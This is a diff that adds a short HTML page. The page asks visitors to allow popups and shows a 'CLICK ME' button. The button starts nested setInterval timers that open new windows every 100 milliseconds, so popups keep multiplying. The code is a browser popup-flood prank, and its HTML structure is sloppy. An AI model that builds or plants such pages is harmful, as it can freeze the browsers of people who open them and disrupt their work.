@@ -1,0 +1,22 @@
+<html>
+    <title>window</title>
+    <script>
+        function openwindow(){
+            window.open('newwindow.html', name, 'width=600', 'height=400');
+        }
+        function main(){
+            console.log("interval starting")
+            setInterval(openwindow, 100)
+            console.log("interval ended")
+        }
+    </script>
+    <head>
+        <body>
+            <h1>BEFORE CLICKING PLEASE ALLOW POPUPS!!</h1>
+            <a href="newwindow.html" target="popup" onclick="setInterval(main, 100)">
+                <button>CLICK ME</button>
+            </a>
+            <h6>i know the page is ugly.</h6>
+        </body>
+    </head>
+</html>
